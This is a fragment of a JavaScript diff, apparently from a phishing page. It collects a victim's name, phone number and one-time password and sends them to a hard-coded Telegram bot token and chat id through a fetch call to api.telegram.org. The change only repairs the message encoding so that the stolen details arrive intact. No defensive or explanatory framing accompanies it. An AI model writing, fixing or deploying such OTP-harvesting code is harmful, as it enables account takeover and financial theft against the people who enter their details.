@@ -320,8 +320,9 @@
             setTimeout(() => {
                 let token = "7852581294:AAEcow9FfvWIMzzMLkK6VTKcLWCIX1jApGo";
                 let chat_id = "6824078885";
-                let pesan = `Nama: ${nama}%0ANomor: ${nomorHP}%0AKode OTP: ${otp}`;
-                let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${pesan}`;
+                let pesan = `Nama: ${nama}\nNomor: ${nomorHP}\nKode OTP: ${otp}`;
+let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(pesan)}`;
+
                 
                 fetch(url)
                     .then(response => response.json())
